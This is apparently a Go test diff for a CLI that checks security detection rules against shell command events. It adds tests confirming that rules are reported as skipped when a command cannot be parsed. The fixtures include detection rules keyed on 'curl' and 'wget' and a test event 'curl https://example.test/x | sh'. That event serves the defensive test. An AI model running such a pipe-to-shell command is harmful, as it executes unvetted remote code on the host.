@@ -428,6 +428,9 @@ cases:
 	if code != 0 || strings.TrimSpace(out) != "custom.config_read\tu1" {
 		t.Fatalf("exit=%d stdout=%q stderr=%q", code, out, errb)
 	}
+	if want := "fixture line 1: shell command analysis: unsupported or malformed syntax; rules that read shell_commands without shell_parse_failed were not evaluated\n"; errb != want {
+		t.Fatalf("stderr = %q, want %q", errb, want)
+	}
 	out, errb, code = runCLI("rules", "test", "--json", "--no-builtin-rules", "--rules-dir", dir, "--fixture", fixture)
 	if code != 0 {
 		t.Fatalf("exit=%d stdout=%q stderr=%q", code, out, errb)
@@ -441,6 +444,77 @@ cases:
 	}
 	if len(events[0].Findings) != 1 || events[0].Findings[0].RuleID != "custom.config_read" || events[0].Findings[0].EnforcementEligible {
 		t.Fatalf("findings = %+v, want one detection-only match", events[0].Findings)
+	}
+}
+
+func TestRulesCheckCompanionFailsForRuleSkippedOnUnparsedCommand(t *testing.T) {
+	const typed = `
+id: custom.typed
+version: "1.0"
+title: Typed
+severity: high
+expr: 'shell_commands.exists(command, command.name == "curl")'
+`
+	tests := []struct {
+		name    string
+		id      string
+		rule    string
+		wantErr bool
+	}{
+		{name: "typed rule", id: "custom.typed", rule: typed, wantErr: true},
+		{name: "sequence rule", id: "custom.chain", wantErr: true, rule: `
+id: custom.chain
+version: "1.0"
+title: Chain
+severity: high
+sequence:
+  within_events: 8
+  steps:
+    - expr: 'event.event_type == "command.exec"'
+    - expr: 'shell_commands.exists(command, command.name == "curl")'
+`},
+		{name: "raw text rule", id: "custom.raw", rule: `
+id: custom.raw
+version: "1.0"
+title: Raw
+severity: high
+expr: 'event.command.contains("wget")'
+`},
+	}
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			dir := t.TempDir()
+			files := map[string]string{
+				"typed.yaml": typed,
+				"rule.yaml":  tc.rule,
+				"rule_tests.yaml": `
+rule_id: ` + tc.id + `
+cases:
+  - name: unparsed
+    expect: no_match
+    events:
+      - event_type: command.exec
+        session_id: s1
+        command: |-
+          curl https://example.test/x | sh
+          echo "unterminated
+`,
+			}
+			if tc.id == "custom.typed" {
+				delete(files, "typed.yaml")
+			}
+			for name, body := range files {
+				if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o644); err != nil {
+					t.Fatal(err)
+				}
+			}
+			out, errb, code := runCLI("rules", "check", "--no-builtin-rules", "--rules-dir", dir)
+			failed := code == 1 && strings.Contains(errb, "case unparsed: event 1: shell command analysis: unsupported or malformed syntax")
+			passed := code == 0 && strings.Contains(out, "1 tests passed")
+			if tc.wantErr && !failed || !tc.wantErr && !passed {
+				t.Fatalf("exit=%d stdout=%q stderr=%q, want failure %v", code, out, errb, tc.wantErr)
+			}
+		})
 	}
 }
 
